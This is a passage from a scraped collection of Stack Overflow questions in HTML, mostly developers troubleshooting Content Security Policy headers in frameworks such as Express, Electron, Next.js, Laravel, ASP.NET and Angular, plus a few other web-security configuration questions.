  }
  console.log(&quot;Connected to the database!&quot;);
});


app.use(
    helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: [&quot;'self'&quot;],
          scriptSrc: [&quot;'self'&quot;],
          frameAncestors: [&quot;'none'&quot;],
          imgSrc: [&quot;'self'&quot;],
          styleSrc: [&quot;'self'&quot;]
        }
      },
      noSniff: true
    })
  );
  

app.get(&quot;/&quot;, (req, res) =&gt; {
  res.json(&quot;Hello, this is the backend&quot;);
});

app.use(cookieParser());
app.use(express.json());
app.use(cors());
app.use(&quot;/api/auth&quot;, authRoutes);
app.use(&quot;/api/users&quot;, userRoutes);
app.use(&quot;/api/films&quot;, filmRoutes);
app.use(&quot;/api/movies&quot;, movieRoutes);
app.use(&quot;/api/reviews&quot;, reviewRoutes);

app.use((err, req, res, next) =&gt; {
  const status = err.status || 500;
  const message = err.message || &quot;Something went wrong!&quot;;
  return res.status(status).json({
    success: false,
    status,
    message
  });
});

app.listen(8800, () =&gt; {
  console.log(&quot;Connected!&quot;);
});
</code></pre>
<p>I have tried configuring the CSP header using helmet but I still cannot see it in the response headers in the network requests.</p>
<p><a href=""https://i.stack.imgur.com/HXOYB.png"" rel=""nofollow noreferrer"">Here's the list of my response headers</a> even after setting up CSP</p>
<p>How do I solve this? Thank you very much!</p>
"
"<p>On my website I have a <code>referrer-policy: strict-origin-when-cross-origin</code> header in place for security purposes but also have a few links pointing to my subdomain.</p>
<p>On my subdomain I am trying to read the origin + path when someone navigates from a link on the main domain to my subdomain because I want to only allow them access when they went by a specific page on the main domain first.</p>
<p>I have read that the origin of a domain and subdomain are completely different so I am not able to obtain the complete URL looking at the headers on the subdomain. Is there a way to do this without sacrificing security or doing it by query params?</p>
"
"<p>I would like to know if the new version 7.7 of Ext JS has resolved the issue of vulnerabilities with CSP headers. Specifically, I would like to know if &quot;unsafe-eval&quot; content security policy has been corrected</p>
<p>I have tried version 7.5 and the problem with &quot;unsafe-eval&quot; CSP still occurs.</p>
"
"<p>I have an issue with Google Maps. everything was working well until two days ago. Now, if I run the app I can use PlacePicker but GoogleMap widget doesn't come up, screen is grayed out.
I have different queries on maps so I created a separate page with a map without any query. Yet this map also is not working. As I said, PlacePicker works, so I believe there is no problem with the API.
After opening console i spotted an issue.
<a href=""https://i.stack.imgur.com/oXCmz.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/oXCmz.png"" alt=""[issue](https://i.stack.imgur.com/8879U.png)"" /></a>
I am not sure if this is the reason of the behaviour, and also if it is I do not know hoow to fix CSP in flutterflow. I restored previous versions of my app to check the behaviour and it is the same.
All your thoughts and suggestions will be highly appreciated :) TIA
<a href=""https://i.stack.imgur.com/5Q58N.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5Q58N.png"" alt=""[screenshot](https://i.stack.imgur.com/RWyRx.png)"" /></a></p>
<ul>
<li>Checked API Key - Confirmed the API key is active and has the needed permissions. Still got a gray screen instead of the map.</li>
<li>Made a Simple Map Page - Created a basic map page without extra features to test. The problem persisted with the same gray screen.</li>
<li>Looked into Console Error - Noticed a CSP error in the console. Unsure how to fix this in FlutterFlow, and the map issue remains unresolved.</li>
</ul>
"
"<p>when I convert my HTML file, to which I added Content Security Policy, into IMG format, the rules I set are overridden, and requests are made to unauthorized addresses. I am adding the following meta tags to my HTML file. Although it works correctly when viewed as HTML, these rules do not work correctly when I convert it to PNG using &quot;NReco.ImageGenerator.HtmlToImageConverter&quot;.</p>
<pre><code>                string sContentSecurityPolicy = &quot;&lt;meta http-equiv=\&quot;X-UA-Compatible\&quot; content=\&quot;IE=edge\&quot;&gt;&quot;;
                sContentSecurityPolicy += &quot;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1.0\&quot;&gt;&quot;;
                sContentSecurityPolicy += &quot;&lt;meta http-equiv=\&quot;Content-Security-Policy\&quot; content=\&quot;default-src 'self' {0} 'unsafe-eval' 'unsafe-inline'; frame-src 'self' {0} data:; frame-ancestors 'self' {0}; object-src 'self'; img-src * blob: data: \&quot;&gt;&quot;;
                sContentSecurityPolicy = string.Format(sContentSecurityPolicy, sSecureDomainList);
</code></pre>
<pre><code>
                    var htmlToImageConv = new NReco.ImageGenerator.HtmlToImageConverter();
                    htmlToImageConv.Width = 756;
                    byte[] imgBytes = htmlToImageConv.GenerateImageFromFile(filePathHtml, NReco.ImageGenerator.ImageFormat.Png);
</code></pre>
<p>I tried converting the HTML code directly and also tried saving and then converting it.</p>
"
"<p>Packages:</p>
<ul>
<li><code>@azure/msal-node: ^2.6.4</code></li>
<li><code>electron: 21.1.1</code></li>
</ul>
<p>I am trying to configure an authorization code flow with PKCE. For that - I am spawning a new window in electron and go through the MS login flow. I have 2FA enabled so when I get to the last step and enter the code in the MS Authentication app on my phone I see in the debug console of the electron app the following error:</p>
<blockquote>
<p>Refused to send form data to 'https://login.microsoftonline.com/common/SAS/ProcessAuth' because it violates the following Content Security Policy directive: &quot;form-action 'self' http https ws wss https: *.microsoftonline.com&quot;.</p>
</blockquote>
<p>I looked through the <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/form-action"" rel=""nofollow noreferrer"">CSP: form-action</a> mozilla documentation and as you can see above - updated my CSP policy to include everything I could think of to make this work, however, to no avail.</p>
<p>Here is my full current CSP policy</p>
<pre><code>const contentSecurityPolicy = [
  &quot;default-src 'self' https:&quot;,
  &quot;script-src * 'unsafe-inline' 'unsafe-eval' https:&quot;,
  &quot;connect-src * 'unsafe-inline' https:&quot;,
  &quot;font-src 'self' https:&quot;,
  &quot;form-action 'self' 'unsafe-inline' 'unsafe-eval' ws: wss: http: https: data: mediaStream: blob: filesystem: *.microsoftonline.com&quot;,
  &quot;img-src 'self' blob: data: https:&quot;,
  &quot;style-src 'self' 'unsafe-inline' https:&quot;
];
</code></pre>
<p>There is also some warning on the mozilla's documentation page about <code>form-action</code> and browser support for re-directs, but I admin I don't fully understand it. Surely there must be a way to make it work in electron.</p>
"
"<p>I had created a Next.js project (version 14.1.0) with the &quot;npx create-next-app@latest&quot; command. After that, in the &quot;public&quot; directory, I created a 'manifest.json' file.:</p>
<pre><code>{
    &quot;manifest_version&quot;: 3,
    &quot;name&quot;: &quot;Test Extension&quot;,
    &quot;version&quot;: &quot;0.0.1&quot;,
    &quot;description&quot;: &quot;NextJs 14.1.0 Chrome Extension&quot;,
    &quot;icons&quot;: {},
    &quot;permissions&quot;: [&quot;webNavigation&quot;],
    &quot;host_permissions&quot;: [&quot;&lt;all_urls&gt;&quot;],
    &quot;action&quot;: {
        &quot;default_popup&quot;: &quot;index.html&quot;
    }
}

</code></pre>
<p>And modified next.config.mjs by adding &quot;output: 'export'&quot;:</p>
<pre><code>/** @type {import('next').NextConfig} */
const nextConfig = {
    output: 'export',
};

export default nextConfig;

</code></pre>
<p>After uploading the build, everything is working fine except for errors that appeared after the first extension opening. These errors look like this:</p>
<blockquote>
<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src 'self'&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-Q+8tPsjVtiDsjF/Cv8FMOpg2Yg91oKFKDAJat1PPb2g='), or a nonce ('nonce-...') is required to enable inline execution.</p>
</blockquote>
<p>I was trying to add _document.tsx from this <a href=""https://dev.to/snaka/securing-your-nextjs-application-with-strict-csp-4lie"" rel=""nofollow noreferrer"">article</a> and middleware.ts from this <a href=""https://borstch.com/blog/development/nextjs-14s-content-security-policy-best-practices"" rel=""nofollow noreferrer"">article</a>
But it didnt help me, nothing changed</p>
"
"<p>I have this in my CSP key in <code>web.config</code>, frame-src 'self' blob: *.xxx.com *.xxx.com; and other things too like default-src , img-src and all but still while retrieving the image or pdf, I am getting error in console</p>
<blockquote>
<p>Refused to frame 'blob:(the URL)' because it violates the following Content Security Policy directive: &quot;frame-src *.xxx.com *.xxx.cn&quot;.</p>
</blockquote>
<p>Any help would be highly appreciated.</p>
"
"<p>I am implementing CSP in my Laravel-based project using a package, but I encountered an error in my console: <strong>Content-Security-Policy: The page’s settings blocked the loading of a resource at inline (&quot;style-src&quot;).</strong></p>
<p>The console has <a href=""https://js.hubspot.com/web-interactives-embed.js"" rel=""nofollow noreferrer"">https://js.hubspot.com/web-interactives-embed.js</a> link.</p>
<p>My CSP is as below</p>
<pre><code>base-uri 'self';
connect-src 'self' www.google-analytics.com t.clarity.ms cta-service-cms2.hubspot.com forms.hubspot.com forms.hscollectedforms.net api.hubapi.com api.hubspot.com;
default-src 'self';
form-action 'self';
img-src 'self' staging.bizgift.com www.facebook.com track.hubspot.com perf-na1.hsforms.com forms.hsforms.com bg-staging-card-data-image.s3.us-east-2.amazonaws.com;
media-src 'self';
object-src 'none';
script-src 'self' 'nonce-xGOAfkOT7dzkL1Lm9iaCYQSUFKaUl9mB' www.clarity.ms www.googletagmanager.com js.hs-scripts.com connect.facebook.net js.usemessages.com js.hscollectedforms.net js.hsleadflows.net js.hs-analytics.net js.hsadspixel.net js.hs-banner.com js.hubspot.com https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/releases/ 'sha256-t4h5VBmDF1HalHj1RIc5rlbzUOVz49wxo+GLAmeWMck=' 'sha256-T916iAHsYCoazOC03cjMMYogCMNmmLm8w2bnMJcVCpI=' 'sha256-DOhucvj5bwyKXX02OUWhVzdUmy+vwezf/yB6BagJdXY=' 'sha256-3g/2E0Wxcw3seFILyZ99YcO9qd7UTSq6biYU+Ax6FRA=' 'sha256-FrEDD233IMeaBOJDMuhTCXG5WkM29jFccD81Q39RsG0=' 'sha256-uRfQyDYxE8FsDbNhR0BF1yVYE9W02Z/xa+uG4/sDaII=' 'sha256-L6v7VHQvrD+uZgEcNVg+dqEMhEjDx6GLydm1hc3sTyk=' 'sha256-gaoCjDPzeBGz9m4DY/gux3C7hM8DaZhy4nLGoTX/dUY=';
style-src 'self' 'nonce-xGOAfkOT7dzkL1Lm9iaCYQSUFKaUl9mB' 'unsafe-inline' fonts.googleapis.com;
child-src 'self';
font-src 'self' staging.bizgift.com fonts.gstatic.com;
frame-src js.usemessages.com;
block-all-mixed-content;
</code></pre>
<p><a href=""https://i.stack.imgur.com/ATvoR.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ATvoR.png"" alt=""enter image description here"" /></a></p>
<p>Can anyone help me with fixing such errors?</p>
"
"<p>I have created a simple HTML web page with the following code:</p>
<pre><code>&lt;a href=&quot;mailto:patel@xyz.com&quot; title=&quot;&quot;&gt;patel@xyz.com&lt;/a&gt;
</code></pre>
<p>I have hosted this app on localhost. With the help of ngRok i have integrated my website on Microsoft teams tab app. Now I am able to see my application in Microsoft 365 as well. If I open app, it loads successfully. But After clicking on my email address(patel@xyz.com), I see a console error:</p>
<blockquote>
<p>Refused to frame '' because it violates the following Content Security Policy directive: &quot;frame-src <em>&quot;. Note that '</em>' matches only URLs with network schemes ('http', 'https', 'ws', 'wss'), or URLs whose scheme matches <code>self</code>'s scheme. The scheme 'mailto:' must be added explicitly.</p>
</blockquote>
<p>Here is my CSP on config file:</p>
<pre><code>&lt;add name=&quot;Content-Security-Policy&quot; value=&quot;default-src: 'self'; frame-src mailto:;&quot; /&gt;
</code></pre>
<p>I tried adding mailto: to frame-ancestor as well. That didn't help.</p>
"
"<p>I'm trying to mitigate XSS attacks by setting the Content-Security-Policy header but Chrome keeps throwing an error:</p>
<p>Refused to execute inline event handler because it violates the following Content Security Policy directive: &quot;script-src 'self' 'nonce-Njg3MGUxNzkyMjViNDZkN2I3YTM3MDAzY2M0MjUxZGEzZmFhNDU0OGZjNDExMWU5OTVmMmMwMTg4NTA3ZmY4OQ=='&quot;. Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.</p>
<p>Here's my Content-Security-Policy header:</p>
<p>Dont want to include style src unsafe-inline in my application while removing its throwing error</p>
<pre><code>        httpResponse.setHeader(
                &quot;Content-Security-Policy&quot;,
                &quot;default-src 'self' 'unsafe-inline' 'unsafe-eval' data:;&quot;
                        + &quot;style-src 'self' fonts.googleapis.com 'sha256-CwE3Bg0VYQOIdNAkbB/Btdkhul49qZuwgNCMPgNY5zw=';&quot; + &quot;base-uri 'self' data:;&quot;
                        + &quot;frame-src 'self' * data:;&quot; + &quot;connect-src 'self' * data:;&quot;
                        + &quot;font-src 'self' fonts.gstatic.com https://cdn.predix-ui.com data:;&quot;
                        + &quot;frame-ancestors 'self' data:&quot;);
        chain.doFilter(request, httpResponse);
</code></pre>
"
"<p><strong>Summary</strong>: Followed Pendo's docs on CSP and also reached out to their support team to confirm our CSP is set correctly, but still getting <code>script-src-elem</code> violations for data.pendo.io.</p>
<p>Per Pendo's docs on CSP:
<a href=""https://support.pendo.io/hc/en-us/articles/360032209131-Content-Security-Policy-CSP"" rel=""nofollow noreferrer"">https://support.pendo.io/hc/en-us/articles/360032209131-Content-Security-Policy-CSP</a></p>
<p>The <code>script-src-elem</code> directive in the CSP header has <code>data.pendo.io</code> added as a source, e.g.</p>
<p><code>script-src-elem 'report-sample' 'self' cdn.pendo.io app.pendo.io pendo-static-&lt;subid&gt;.storage.googleapis.com data.pendo.io;</code></p>
<p>The <code>script-src</code> directive is set up similarly. But while the CSP reports for <code>script-src</code> have been resolved, reports for <code>script-src-elem</code> are still coming in.</p>
<p><code>blocked-uri</code> is reported as <code>https://data.pendo.io/data/guide.js/&lt;path&gt;?&lt;id, encoded jzb, v, ct params&gt;</code>, same as observed in the guide.js events sent by the Pendo agent when it initializes with visitor metadata, or when a new identify event is sent for a new visitor ID.
Nothing reported for <code>script-sample</code>, line number, etc.
<code>document-uri</code> is as expected, showing high traffic app pages.</p>
<p>Have already reached out to Pendo support, who were unable to explain the behavior.</p>
<p>Since I'm using a request param to track the version of the CSP being served in <code>report-uri</code>, and <code>if-modified-since</code> and <code>etag</code> headers are set so requests aren't being cached, it shouldn't be because users are reporting based on an outdated CSP.</p>
<p>Sadly haven't been able to repro the violation myself, already tried visiting the site with all our Pendo guides and their steps. Based on user-agent headers and other logs, user's choice of browser does not appear to be a factor, also does not appear to be bot traffic.</p>
"
"<p>I'm seeing a lot of violation reports like this (100s per day):</p>
<pre><code>&quot;csp-report&quot;: {
    &quot;document-uri&quot;: &quot;https://example.com/en/path&quot;,
    &quot;referrer&quot;: &quot;https://example.com/en/path&quot;,
    &quot;violated-directive&quot;: &quot;connect-src&quot;,
    &quot;effective-directive&quot;: &quot;connect-src&quot;,
    &quot;original-policy&quot;: &quot;...; connect-src 'self' https://example.net google.com ...etc.&quot;,
    &quot;blocked-uri&quot;: &quot;https://example.com/&quot;,
    &quot;status-code&quot;: 0
}
</code></pre>
<p>I would have thought that 'self' means that 'mydomain.com' is allowed?</p>
<p>Are these valid reports or have I misunderstood the syntax?</p>
<p>Can they be ignored? (or might some functionality of the app then stop working, if they are due to some bug in a browser?) They come from a variety of browsers and OS.</p>
<p>There is only one CSP on the site - this is certain.</p>
"
"<p>I am having a trusted application embedded in my own application via an iframe. It works for most parts...but the custom date picker does not work -&gt; as it throws a SecurityError as per <a href=""https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement/showPicker#securityerror"" rel=""nofollow noreferrer"">https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement/showPicker#securityerror</a></p>
<p>I have full control over both applications and can set any required tags / properties.</p>
<p>But what ever I tried, CSP with frame-ancestors / frame-src or Permissions-Policy does not work.</p>
<p>I saw in here <a href=""https://developer.chrome.com/blog/show-picker"" rel=""nofollow noreferrer"">https://developer.chrome.com/blog/show-picker</a></p>
<blockquote>
<p>We could add a permissions policy which allows cross-origin iframes to show browser pickers when their parent chain allows them to do so.</p>
</blockquote>
<p>So am I correct that I have no way in Chromium based browsers to get the showPicker to work in a cross origin iframe usage as the permission policy is not yet there?</p>
<p>(Btw Firefox, we don't have an issue and the site works as expected.)</p>
"
"<p>I have a CSP (Content Security Policy) implemented in an ASP.NET MVC application. I want the CSP violation report to be sent to the desired endpoint.</p>
<p>After reviewing CSP documentation, there are two ways to implement this:</p>
<ol>
<li><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri"" rel=""nofollow noreferrer"">report-uri</a></li>
<li><a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to"" rel=""nofollow noreferrer"">report-to</a></li>
</ol>
<p>According to mdn doc, <code>report-uri</code> is deprecated and recommended way is the <code>report-to</code>. Just for testing purposes, I am trying to implement both.</p>
<p>Implementation using <code>report-uri</code> works fine without any issues - however, implementation using <code>report-to</code> doesn't work and this is where I need help to resolve the issue. Note that I am testing on Chrome browser.</p>
<p>Please see my code for each implementation followed by my endpoint.</p>
<p>This code here is the implementation using <code>report-uri</code>, and it works fine as my endpoint is made which I confirmed by putting a breakpoint:</p>
<pre><code>app.Use(async (context, next) =&gt;
{
    var cspHeader = context.Response.Headers[&quot;Content-Security-Policy&quot;].ToString();
    // Add the report-uri directive to the existing CSP header
     cspHeader += &quot;; report-uri https://localhost:6001/ApplicationLogs/CSPReport&quot;;
    // Set the modified CSP header
    context.Response.Headers[&quot;Content-Security-Policy&quot;] = cspHeader;
    await next();
});
</code></pre>
<p>This second piece of code is the implementation using the <code>report-to</code> directive, which doesn't work, as my endpoint is never reached. Please look at the code below on how I have implemented this:</p>
<pre><code>app.Use(async (context, next) =&gt;
{
    var reportToValue = new[]
    {
        new
        {
            group = &quot;csp-endpoint&quot;,
            max_age = 10886400,
            endpoints = new[] { new { url = &quot;https://localhost:6001/ApplicationLogs/CSPReport&quot; } },
            include_subdomains = true
        }
    };

    var reportToHeader = JsonSerializer.Serialize(reportToValue);
    context.Response.Headers[&quot;Report-To&quot;] = reportToHeader;

    // Get the existing CSP header
    var cspHeader = context.Response.Headers[&quot;Content-Security-Policy&quot;].ToString();

    // Add the report-to directive to the existing CSP header
    cspHeader += &quot;; report-to csp-endpoint&quot;;

    // Set the modified CSP header
    context.Response.Headers[&quot;Content-Security-Policy&quot;] = cspHeader;

    await next();
});
</code></pre>
<p>My endpoint is:</p>
<pre><code>endpoints.MapPost(&quot;/ApplicationLogs/CSPReport/&quot;, async context =&gt;
{
    using var reader = new StreamReader(context.Request.Body);
    var body = await reader.ReadToEndAsync();

    // Log the CSP report
    // This is a simple example, you might want to use a proper logging solution in a real application
    Console.WriteLine(body);
});
</code></pre>
<p>Can someone clarify what might be wrong with my <code>report-to</code> implementation?</p>
"
"<p>I'm trying to configure my CSP to allow GTM to load script with external connection like clarity.</p>
<p>I can make it work by adding clarity url to the <code>connect-src</code> directive.
Is there a way to make it automatic like the <code>strict-dynamic</code> for the <code>script-src</code> ?</p>
<p>my csp for référence:</p>
<pre><code>content=&quot;default-src 'self';
    connect-src 'self' https://*.clarity.ms https://c.bing.com;
    img-src * data: www.googletagmanager.com;
    script-src 'unsafe-inline' https: 'nonce-{{nonce}}' 'strict-dynamic'&quot;
</code></pre>
"
"<p>I am using 'trix-rails' gem in a Ruby on Rails project. I need to make the project abide to no unsafe-inline CSP, but I have problems with the two style tags generated by trix in the header.</p>
<p>I am using trix-rails as per the instructions:</p>
<pre><code>...
//= require trix
//= require_tree .
...
</code></pre>
<p>... in my assets/javascript/application.js</p>
<p>I think that triggers the following file's execution: <a href=""https://github.com/basecamp/trix/blob/custom-elements-v1/src/trix/core/helpers/custom_elements.coffee"" rel=""nofollow noreferrer"">https://github.com/basecamp/trix/blob/custom-elements-v1/src/trix/core/helpers/custom_elements.coffee</a>, which inserts two inline style tags into the DOM:</p>
<p><a href=""https://i.stack.imgur.com/g1z0e.png"" rel=""nofollow noreferrer"">style tags</a></p>
<p>Now I know that the latest version of trix-editor comes with the capability of addinga nonce to these tags, but unfortunately trix-rails uses v.1.3.1.
There is the possibility of introducing ActionText but I'd like to keep code changes (and database changes) to the minimum.</p>
<p>I have extracted the css to a seperate file but cannot get rid of the tags. There was a suggestion to use Trix.config for that but I can't figure out how to do it. Any suggestions?</p>
"
"<p>I've implemented a Content Security Policy (CSP) in my ASP.NET Core application, but it's not working as expected when deployed to my stage environment, which includes Docker, ECS, and load balancing in the process. Even when testing locally with Docker Desktop, I couldn't find the CSP header in the response. Has anyone encountered a similar situation or have suggestions on how to troubleshoot this issue? Any insights would be appreciated!</p>
<p>I have an ASP.NET Core web application where I've implemented Content Security Policy (CSP) using the following code snippet in my layout.cshtml file:</p>


<p>This setup works perfectly fine on my local machine on both debug and release mode. when I check the response headers, I can see CSP.</p>
<blockquote>
<p><a href=""https://i.stack.imgur.com/0iSUy.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
</blockquote>
<p>However, when I deploy the application to my stage environment, which involves Docker, ECS (Elastic Container Service), and load balancing, the CSP doesn't seem to work as expected.</p>
<p>To investigate, I suspected Docker and tested the application on Docker Desktop locally. Surprisingly, I couldn't find the CSP header in the response headers, even on my local machine.
<a href=""https://i.stack.imgur.com/FslWQ.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>Has anyone encountered a similar situation, or does anyone have suggestions on how to troubleshoot and overcome this issue? I'm particularly interested in understanding why the CSP headers aren't being transmitted, especially when using Docker, and how to ensure their proper delivery in the deployment environment.</p>
<p>Thank you for any insights or assistance you can provide!</p>
"
"<p>I am a freelance and working on frontend application where we have content security policy is applied on our application which is developed in angular 16. earlier we have applied Unsafe-evel and Unsafe-inline to allow inline scripts and contents but now we need to apply nOnce in which we need to generate random number and set it in the header of our application.</p>
<p>For this purpose, I have created a sample angular application and generate random number token using dot net api and call this api from angular application to get that random number. after this I have set this random number in the header of index.html and this solution is working for my sample application but throwing error in my main application which is much bigger and having multiple contents to load.</p>
<p>please let me what I need to apply so that nonce work properly in my application.</p>
<p>My code (app.component.ts)</p>
<pre><code>private setCSP(): void {
    const cspMeta = this.renderer.createElement('meta');
    this.nonce = &quot;nonce-YvY2gYXxZl1GW8GkCK9x8GXoZYV5EJAy&quot;;
    this.renderer.setAttribute(cspMeta, 'http-equiv', 'Content-Security-Policy');
    this.renderer.setAttribute(cspMeta, 'content', `default-src 'self'; style-src 'self';img-src 'self' data:; font-src 'self'; script-src self; 'nonce-${this.nonce}'`);
    this.renderer.appendChild(this.document.head, cspMeta);
  }
</code></pre>
<pre><code>getNonce() {
    this.http.get&lt;any&gt;('/weatherforecast').subscribe(
      (result) =&gt; {
       
        console.log(result.nonce);
        this.nonce  = result.nonce;
 
        const script = this.renderer.createElement('script');
        const text = this.renderer.createText(`window.dynamicValue = '${this.nonce}';`);
        this.renderer.appendChild(script, text);
        this.renderer.appendChild(this.document.head, script);
 
      },
      (error) =&gt; {
        console.error(error);
      }
    );
  }
 
  title = 'NONCE';
}
</code></pre>
<pre><code>
ngOnInit() {
    //  this.getNonce();
    this.nonce = this.generateNonce();
    this.setCSP();
  }
</code></pre>
<p>Code:(index.html)</p>
<pre><code>&lt;!doctype html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;NonceDemoApp&lt;/title&gt;
    &lt;base href=&quot;/&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
    &lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;favicon.ico&quot;&gt;
    
&lt;/head&gt;
&lt;body&gt;
    &lt;app-root&gt;&lt;/app-root&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Error Message attached here:
<a href=""https://i.stack.imgur.com/Yjax9.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
<p>I tried to generate nonce token using server and front end and passing this value to header in index.html and it is working perfect in my sample angular application but not working in my main application on which I am working</p>
"
"<p>This is the code that i'm using for my htaccess but somehow the menu is not working im using Astra and Elementor,</p>
<pre><code>Header always set Content-Security-Policy &quot;\
default-src 'self' 'unsafe-eval' 'unsafe-inline';  \
font-src 'self' data: https://fonts.gstatic.com https://fonts.intercomcdn.com https://maxcdn.bootstrapcdn.com;  \
img-src 'self' data: https: *.gravatar.com;  \
script-src 'self';  \
manifest-src 'self';  \
media-src 'self' https://wistia.com https://youtube.com;  \
frame-src 'self' https://dataon.ph https://greatdayhr.ph https://js.intercomcdn.com https://forms.office.com/ https://wordpress.com/ https://wordpress.org/ https://intercom.com https://wordpress.org/plugins https://widget.intercom.io/widget/cl2yoxkc https://api-iam.intercom.io;  \
base-uri 'none';  \
frame-ancestors 'none';  \
report-uri https://65e16e9e354c350f2911915f.endpoint.csper.io/?v=3; \
worker-src blob:;\
connect-src 'self' https://dataon.ph https://greatdayhr.ph https://js.intercomcdn.com  https://api-iam.intercom.io https://px.ads.linkedin.com https://reallyfreegeoip.org https://www.google-analytics.com wss://nexus-websocket-a.intercom.io https://intercom.com https://widget.intercom.io/widget/cl2yoxkc https://api-iam.intercom.io;  \
style-src 'self' 'unsafe-inline' https: fonts.googleapis.com ajax.googleapis.com downloads.mailchimp.com fonts.googleapis.com maxcdn.bootstrapcdn.com www.gstatic.com;  \
object-src 'none';  \
#require-trusted-types-for 'script';&quot;
</code></pre>
<p><a href=""https://i.stack.imgur.com/lMVzb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lMVzb.png"" alt=""When The Htaccess code run this is what happen"" /></a></p>
<p>Need help for the issue i need to improve</p>
"
"<p>I am using an application where I want to load csp nonce in System.config.ts file.
I am using Spring application on backend and thymeleaf for template.</p>
<p>The nonce is created on the server and passed on as request.parameter
This is the HTML code:</p>
<pre><code>...
&lt;head&gt;
... 
&lt;script th:src=&quot;@{/lib/system/system.js}&quot; th:nonce=&quot;${scriptNonce}&quot;&gt;&lt;/script&gt;
&lt;script th:src=&quot;@{/client/system.config.js}&quot; th:nonce=&quot;${scriptNonce}&quot;&gt;&lt;/script&gt;
...
&lt;/head&gt;
</code></pre>
<p>scriptNonce is getting applied properly. I want this scriptNonce to be accessible from system.config.ts file as well</p>
<p>The file looks like this</p>
<pre><code>SystemJS.config({
    baseURL: '/',
    warnings: true,
    meta: {
        '*' : {
            nonce: document.getElementsByTagName('script')[0].nonce,
        },
      ...
    }
}
</code></pre>
<p>the nonce for '*' means it gets applied for every dependency and I do not have to use usafe-eval in my CSP for script-src directive.</p>
<p>When I compile the project npm run gulp local-ts then it works fine. But when I use npm run gulp server-ts, it gives following error</p>
<pre><code>evalmachine.&lt;anonymous&gt;:6
            nonce: document.getElementsByTagName('script')[0].nonce
                   ^

ReferenceError: document is not defined
    at evalmachine.&lt;anonymous&gt;:6:20
    at Script.runInContext (node:vm:141:12)
    at Script.runInNewContext (node:vm:146:17)
    at Object.runInNewContext (node:vm:306:38)


</code></pre>
<p>My question - is there a proper way to include the nonce in the system.config.ts file?</p>
"
"<p>I made a custom step for the keycloak authentication flow. I want to get the JSON structure for it via REST API.</p>
<pre><code>GET /admin/realms/{realm}/authentication/flows/{id}
</code></pre>
<p>and</p>
<pre><code>GET /admin/realms/{realm}/authentication/flows/{flowAlias}/executions
</code></pre>
<p>return only build-in steps.</p>
"
"<p>I'm looking for guidance on implementing key security headers for my website. Specifically, I'm interested in codes for the following headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, Strict-Transport-Security, cross-origin-embedder-policy, cross-origin-opener-policy, cross-origin-resource-policy. Could you provide me with the appropriate codes for these headers? I want to enhance the security of my website and ensure a safer online experience for visitors.&quot;</p>
<p>I haven't implemented any changes yet. I'm seeking guidance on how to enhance the security of my website by using the provided HTTP header codes. What steps or considerations should I be aware of before making these changes, and what outcomes can I expect in terms of improved security?</p>
"
"<p>As a prefix, I realize that security, particularly as it pertains to iframes, is aspirational, but I'm exploring strategies for how can I (relatively) secure an iframe in another document.</p>
<p>If it helps for context, I'm trying to embed a user-specific page inside of Notion.</p>
<p>I have an application that a user authenticates with. When they authenticate, they have an option to embed a page that is specific to their account with a unique URL. The host page and the embedded page are on different domains. Although the user is authenticated with my application, the embedded page doesn't have the ability to carry over any of the session information.</p>
<p>Right now, it's secure insofar as the URL is unique to the user, but if anybody else has the URL they can view the contents. What strategies can I use to prevent unauthorized parties from opening and viewing the page? Ideally, somehow, the embedded page could be hydrated with the authenticated session. Another idea I had was to require a key/password on initial load that then gets stored in local storage. I'm aware of Content Security Policy, but from my understanding, that only prevents non-whitelisted domains from hosting the frame.</p>
<p>Additional context for my use case: I have a public Notion integration that is using the Notion authentication to get access tokens which is used for calling the Notion API to embed the page, but this doesn't really help in security of the contents of the embedded page.</p>
<p>Any tips or techniques you all could suggest?</p>
"
"<p>I am in the process of transitioning my monolithic ASPX WebForms application to a modern architecture utilizing a React frontend and a C# REST API backend. A particular area of inquiry for me concerns the mechanisms of authentication and authorization within this new setup.</p>
<p>To facilitate user management, I have established User Pools in the AWS Cognito console. Rather than adopting callback-based routing, I am contemplating the development of bespoke login and signup pages . This approach, however, raises concerns regarding the security implications of crafting a custom authentication solution as opposed to leveraging the AWS Hosted UI.</p>
<p>Could you provide insight into which option would offer superior security in the long term?</p>
"
"<p>I have a website on Port 443 on an nginx server.
The port of this server is wide open to the internet.
The website that is hosted on the server, has a valid SSL cert, has a login ID, password and 2FA configured to login to the application.
My concern is, is there a way that can an unauthorized user or a hacker can get a backdoor entry into the server through port 443?</p>
<p>If there is a chance of back door entry into the server, what security constraints can I put in place to secure the unauthorized entries.</p>
"
"<p>I've been exploring the possibility of using Krakend as a proxy for my Nginx frontend, and I'd like to share my experience and gather some insights from the community.</p>
<p>Here's the setup:</p>
<ol>
<li>I have a Spring Boot server serving as an API.</li>
<li>There's a static site hosted on Nginx, both running within a VM.</li>
<li>Krakend is running on a separate VM, acting as an API manager for the Spring Boot server.</li>
</ol>
